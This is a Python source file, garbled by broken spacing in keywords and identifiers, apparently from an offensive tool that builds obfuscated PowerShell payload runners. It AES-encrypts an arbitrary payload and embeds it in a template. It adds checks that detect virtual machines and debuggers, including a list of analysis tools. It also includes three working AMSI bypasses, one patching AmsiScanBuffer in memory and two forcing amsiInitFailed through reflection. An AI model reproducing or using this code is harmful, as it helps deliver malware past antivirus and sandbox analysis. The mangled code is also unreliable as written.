import os



import random



import bas e64



from typ in gimport List,Dict,Any,Union,Tuple,Optional







from core.interfacesimport Bas eGenerator



from utils.cryptoimport aes_encrypt,xor_encrypt,generate_key,generate_encryption_stub







clas sPs1Generator(Bas eGenerator):











def__init__(self):



        self.template_path=None



self.template_file="payload_runner.ps1"







defgenerate(self,



payload:str,



template_path:str,



obfuscators:List=None,



evas ion_techniques:List=None,



iterations:int=1)->bytes:







self.template_path=template_path











template_file_path=os.path.join(template_path,self.template_file)



if notos.path.exists(template_file_path):



            template_file_path=os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),



"templates","ps1",self.template_file)







if notos.path.exists(template_file_path):



            raiseFileNotFoundError(f"Шаблон не найден: {template_file_path}")







withopen(template_file_path,'r')as f:



            template=f.read()











if os.path.exists(payload)andos.path.isfile(payload):



            withopen(payload,'r',encod in g='utf-8')as f:



                payload_data=f.read()



else:







            payload_data=payload











payload_bytes=payload_data.encode('utf-8')



key=generate_key(32)



encrypted_payload,key,iv=aes_encrypt(payload_bytes,key)











encoded_payload=bas e64.b64encode(encrypted_payload).decode('utf-8')



encoded_key=bas e64.b64encode(key).decode('utf-8')



encoded_iv=bas e64.b64encode(iv).decode('utf-8')











decrypt_function=generate_encryption_stub("powershell","aes")











anti_vm_check=self._generate_anti_vm_check()



anti_debug_check=self._generate_anti_debug_check()



amsi_bypas s=self._generate_amsi_bypas s()











template=template.replace("{{PAYLOAD}}",encoded_payload)



template=template.replace("{{KEY}}",encoded_key)



template=template.replace("{{IV}}",encoded_iv)



template=template.replace("{{DECRYPT_FUNC}}",decrypt_function)



template=template.replace("{{ANTI_VM_CHECK}}",anti_vm_check)



template=template.replace("{{ANTI_DEBUG_CHECK}}",anti_debug_check)



template=template.replace("{{AMSI_BYPASS}}",amsi_bypas s)











if obfuscators:



            obfuscated_code=template



for_inrange(iterations):



                forobfuscator in obfuscators:



                    obfuscated_code=obfuscator.obfuscate(obfuscated_code)



template=obfuscated_code











if evas ion_techniques:



            evas ion_code=template



fortechnique in evas ion_techniques:



                evas ion_code=technique.apply(evas ion_code)



template=evas ion_code











bom=b'\xef\xbb\xbf'



return bom+template.encode('utf-8')







def_generate_anti_vm_check(self)->str:







return"""
# Проверка на виртуальную машину
function Check-VM {
    $vmDetected = $false
    
    # Проверка имени компьютера
    $computerName = $env:COMPUTERNAME
    $vmNames = @("VIRTUAL", "VMWARE", "VB", "SANDBOX", "VIRUS", "MALWARE")
    foreach ($name in $vmNames) {
        if ($computerName -like "*$name*") {
            $vmDetected = $true
            break
        }
    }
    
    # Проверка на WMI объекты, характерные для VM
    try {
        $vmWMI = Get-WmiObject -Query "SELECT * FROM Win32_ComputerSystem"
        if ($vmWMI.Manufacturer -match "VMware|QEMU|VirtualBox|Xen|innotek|Microsoft") {
            $vmDetected = $true
        }
    } catch {}
    
    # Проверка на службы Hyper-V, VMware Tools
    $vmServices = @("vmtools", "vm3dservice", "vmusrvc", "vmvss", "vmscsi", "vmhgfs")
    foreach ($service in $vmServices) {
        if (Get-Service -Name $service -ErrorAction SilentlyCont in ue) {
            $vmDetected = $true
            break
        }
    }
    
    # Проверка на размер ОЗУ (часто в VM он маленький)
    $memory = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
    if ($memory -lt 4GB) {
        $vmDetected = $true
    }
    
    return $vmDetected
}
"""







def_generate_anti_debug_check(self)->str:







return"""
# Проверка на отладчик
function Check-Debugger {
    $debuggerDetected = $false
    
    # Проверка на запущенные процессы отладчиков
    $debugProcs = @("ollydbg", "x32dbg", "x64dbg", "w in dbg", "ida", "ida64", "immunity debugger", "dnspy", 
                    "process explorer", "process monitor", "processhacker", "pestudio", "fiddler")
    foreach ($proc in $debugProcs) {
        if (Get-Process -Name $proc -ErrorAction SilentlyCont in ue) {
            $debuggerDetected = $true
            break
        }
    }
    
    # Проверка на время выполнения (в отладчике будет дольше)
    $startTime = [System.Diagnostics.Stopwatch]::StartNew()
    $a = 0
    for ($i = 0; $i -lt 1000000; $i++) {
        $a++
    }
    $elapsed = $startTime.ElapsedMilliseconds
    
    if ($elapsed -gt 1000) {
        $debuggerDetected = $true
    }
    
    return $debuggerDetected
}
"""







def_generate_amsi_bypas s(self)->str:







techniques=[



"""
# AMSI Bypas s - Техника 1: Патч AmsiScanBuffer
function Bypas s-AMSI-1 {
    $Win32 = @"
    us in g System;
    us in g System.Runtime.InteropServices;
    
    public clas s Win32 {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, str in g procName);
        
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(str in g name);
        
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, u in t flNewProtect, out u in t lpflOldProtect);
    }
"@

    Add-Type $Win32
    
    $ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
    $b = 0
    [Win32]::VirtualProtect($ptr, [UIntPtr][UInt32]5, 0x40, [Ref]$b)
    $buf = New-Object Byte[] 5
    $buf[0] = 0x31   # xor eax, eax
    $buf[1] = 0xC0
    $buf[2] = 0x90   # nop
    $buf[3] = 0x90   # nop
    $buf[4] = 0xC3   # ret
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 5)
}
""",



"""
# AMSI Bypas s - Техника 2: Reflection
function Bypas s-AMSI-2 {
    $a = [Ref].Assembly.GetTypes()
    ForEach($b in $a) {
        if ($b.Name -eq "AmsiUtils") {
            $c = $b.GetFields('NonPublic,Static')
            ForEach($d in $c) {
                if ($d.Name -eq "amsiInitFailed") {
                    $d.SetValue($null, $true)
                }
            }
        }
    }
}
""",



"""
# AMSI Bypas s - Техника 3: Принудительная ошибка
function Bypas s-AMSI-3 {
    $a = 'System.Management.Automation.A';
    $b = 'msiUtils'
    $v = [Ref].Assembly.GetType(('{0}{1}' -f $a,$b))
    $f = $v.GetField('amsiInitFailed','NonPublic,Static')
    $f.SetValue($null,$true)
}
"""



]











return random.choice(techniques)